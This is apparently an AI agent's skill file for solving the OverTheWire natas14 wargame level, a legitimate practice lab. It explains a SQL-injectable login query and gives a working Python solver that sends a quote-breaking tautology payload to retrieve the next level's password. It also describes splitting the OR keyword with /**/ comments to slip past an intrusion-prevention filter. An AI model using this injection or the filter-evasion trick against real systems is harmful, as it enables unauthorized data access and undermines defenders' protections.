---
name: natas-14
description: >-
  Use when solving OverTheWire natas14: the login query interpolates the POSTed
  username/password into a SELECT with no escaping, so a quote-breaking
  tautology returns a row and the page prints the natas15 password; the OR
  keyword is split with inline /**/ comments to slip past an IPS on the path
  that drops obvious SQLi.
---
# natas14

Solve OverTheWire **natas14** and print the **natas15** password.

## Weakness

The login form builds its query by string-concatenating the POSTed fields:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

Nothing is escaped, so a double-quote closes the string literal and a tautology (`" OR "a"="a`) makes the WHERE always true. Any returned row makes the page print the natas15 password.

## Network note (IPS evasion)

The path to the natas hosts (from the user's desktop) runs an intrusion-prevention device that silently drops request bodies matching an obvious SQL-injection signature: a plain `" OR "a"="a` payload never gets a response and times out, while benign requests to the same page return instantly. Splitting the `OR` keyword with inline `/**/` comments (`bob"/**/OR/**/"a"="a`) stays valid SQL — MySQL treats `/**/` as whitespace — but no longer matches the signature, so it passes.

## Inputs

- `NATAS14_USER` (usually `natas14`)
- `NATAS14_PASS` (current natas14 password)

## Run

The natas hosts are reachable only from the user's desktop (x1c), not the box. Copy `solve.py` (below) to x1c and run it there with Python:

```
python natas14-solve.py <NATAS14_USER> <NATAS14_PASS>
```

It prints the natas15 password on stdout. Verify:

```
curl.exe -s -o NUL -w "%{http_code}" -u natas15:<PRINTED_PASS> http://natas15.natas.labs.overthewire.org/
```

Expect `200`.

## solve.py

```python
#!/usr/bin/env python3
"""Solve natas14: the login query interpolates the POSTed username/password into
    SELECT * from users where username="..." and password="..."
with no escaping, so a tautology returns a row and the page prints the natas15
password. Note: the network path to the host runs an IPS that drops obvious SQLi
bodies, so the OR keyword is split with inline /**/ comments (MySQL treats them as
whitespace) to evade the signature while staying valid SQL."""
import base64
import re
import sys
import urllib.parse
import urllib.request

BASE = "http://natas14.natas.labs.overthewire.org"

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <natas14_user> <natas14_pass>", file=sys.stderr)
        sys.exit(1)
    user, password = sys.argv[1], sys.argv[2]
    auth = "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()

    data = urllib.parse.urlencode({
        "username": 'bob"/**/OR/**/"a"="a',
        "password": 'x',
    }).encode()
    req = urllib.request.Request(BASE + "/index.php", data=data, headers={
        "Authorization": auth,
        "Content-Type": "application/x-www-form-urlencoded",
    })
    html = urllib.request.urlopen(req, timeout=25).read().decode("utf-8", errors="replace")
    m = re.search(r"natas15.*?([A-Za-z0-9]{32})", html, re.S)
    if not m:
        m = re.search(r"([A-Za-z0-9]{32})", html)
    if not m:
        print("No password in response", file=sys.stderr); print(html, file=sys.stderr); sys.exit(1)
    print(m.group(1))

if __name__ == "__main__":
    main()
```
